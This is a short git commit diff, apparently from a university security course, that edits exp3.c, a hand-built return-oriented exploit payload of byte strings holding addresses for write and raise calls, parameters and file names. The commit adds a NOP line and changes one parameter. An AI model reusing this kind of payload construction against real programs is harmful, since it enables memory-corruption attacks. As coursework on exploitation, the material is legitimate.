a3127e372b8d0a3abaa08a0d79b42e1bc652def7
malique-bodie <malique_bodie@brown.edu>
2021-10-28 06:36:42 -0400

    close

--- exp3.c
+++ exp3.c
@@ -30,10 +30,11 @@ unsigned char payload[] =
 	"\x00\x00\x00\x00"					//<third param>
 	"\x10\xf0\xec\xb3" 					//<write> 0xb3ecf010
 	"\x6d\xb8\xdf\xb3"					//<return>  0001e86d +  0xb3dfa0f0 = 0xB3DFB86D
-	"\x03\x00\x00\x00"					//<first param> 
+	"\x03\x00\x00\x0"					//<first param> 
 	"\x56\xc3\xff\xbf"					//<second param> 0xBFFFC356
 	"\x06\x00\x00\x00"					//<third param>
 	"\x40\x1d\xe1\xb3"					//<raise> 0xb3e11d40
+	"\x90\x90\x90\x90"
 	"\x0c\x00\x00\x00"					//<first param>
 	"magic.txt\x00" 					//0xBFFFC34C
 	"xyzzy\x00"; 						//0xBFFFC356						
